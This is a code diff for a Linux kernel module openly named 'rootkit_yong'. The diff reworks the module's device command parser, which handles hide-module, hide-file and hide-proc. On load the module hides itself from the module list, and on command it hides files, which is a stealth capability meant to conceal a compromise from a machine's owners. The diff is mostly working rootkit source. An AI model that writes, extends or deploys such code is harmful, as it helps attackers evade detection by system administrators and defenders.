@@ -7,7 +7,6 @@
 #include <linux/version.h>
 
 #include "module.h"
-#include "proc.h"
 #include "file.h"
 
 #define DEVICE_NAME "rootkit_yong"
@@ -19,11 +18,11 @@ MODULE_DESCRIPTION("...");
 MODULE_VERSION("0.1");
 
 static int majorNumber;
-static char message[256] = {0};
+static char message[128] = {0};
+
 static char command[32] = {0};
-static char pid[8] = {0};
 static char filePath[64] = {0};
-static short size_of_message;
+
 static struct class* charClass = NULL;
 static struct device* charDevice = NULL;
 
@@ -31,15 +30,6 @@ static int	dev_open(struct inode*, struct file*);
 static int	dev_release(struct inode*, struct file*);
 static ssize_t	dev_read(struct file*, char*, size_t, loff_t*);
 static ssize_t	dev_write(struct file*, const char*, size_t, loff_t*);
-
-int katoi(char* string) {
-	long res;
-
-	if(kstrtol(string, 10, &res) == 0)
-		return (int)res;
-
-	return -1;
-}
 
 static struct file_operations fops = {
 	.open = dev_open,
@@ -72,7 +62,7 @@ static int __init rootkit_yong_init(void) {
 
 	
 	printk(KERN_INFO "Rootkit_yong inserted :)\n");
-	hide_module(1);
+	toggle_module_visible(1);
 	return 0;
 }
 
@@ -101,18 +91,13 @@ static ssize_t dev_write(struct file* filep, const char* buffer, size_t len, lof
 	while(1) {
 		if(message[cursor] == ' ') {
 			storage[i] = '\0';
-			if (strcmp(storage, "hide-proc") == 0 || strcmp(storage, "unhide-proc") == 0) {
-				storage = pid;
-				i = -1;
-			} else if (strcmp(storage, "hide-file") == 0 || strcmp(storage, "unhide-file") == 0) {
-				storage = filePath;
-				i = -1;
-			} else if (strcmp(storage, "hide-module") == 0 || strcmp(storage, "unhide-module") == 0) {
+			if (strcmp(storage, "hide-module") == 0 || strcmp(storage, "unhide-module") == 0) {
 				storage[i] = '\0';
 				break;
+			} else {
+				storage = filePath;
+				i = -1;
 			}
-			else
-				return -1;
 		} else if(message[cursor] == '\0') {
 			storage[i] = '\0';
 			break;
@@ -123,20 +108,19 @@ static ssize_t dev_write(struct file* filep, const char* buffer, size_t len, lof
 		cursor++;
 	}
 
-	if(strcmp(command, "hide-proc") == 0) {
-		hide_file(pid);
-		//hide_proc(katoi(storage));
-	}
-	else if (strcmp(command, "unhide-proc") == 0)
-		unhide_file_all();
-	else if (strcmp(command, "hide-file") == 0)
+	if(strcmp(command, "hide-module") == 0)
+		toggle_module_visible(1);
+	else if(strcmp(command, "unhide-module") == 0)
+		toggle_module_visible(0);
+	else if(strcmp(command, "hide-proc") == 0 || strcmp(command, "hide-file") == 0) {
+		printk(KERN_ALERT "%s\n", filePath);
 		hide_file(filePath);
-	else if (strcmp(command, "unhide-file") == 0)
+		//toggle_file_visible(filePath, 1);
+	}
+	else {
 		unhide_file_all();
-	else if (strcmp(command, "hide-module") == 0)
-		hide_module(1);
-	else if (strcmp(command, "unhide-module") == 0)
-		hide_module(0);
+		//toggle_file_visible(filePath, 0);
+	}
 
 	return 1;
 }
